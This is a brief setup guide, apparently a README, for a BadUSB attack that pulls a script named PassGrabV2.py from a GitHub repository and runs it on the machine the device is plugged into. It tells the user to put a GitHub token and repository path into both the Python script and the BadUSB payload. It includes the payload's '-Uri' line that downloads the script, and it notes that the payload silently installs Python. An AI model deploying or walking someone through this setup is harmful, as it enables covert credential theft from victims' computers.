you need to upload the python script to github.

in the python script there is 
GITHUB_TOKEN = "github token here"
REPO_SLUG = "GithubUsername/reponame"
you need to change those


in the badusb script you need to change
$token="GITHUB TOKEK HERE"
-Uri "https://api.github.com/repos/USERNAME/REPONAME/contents/PassGrabV2.py"

both of these are on the same line.

the badusb script also installs python 3.10.0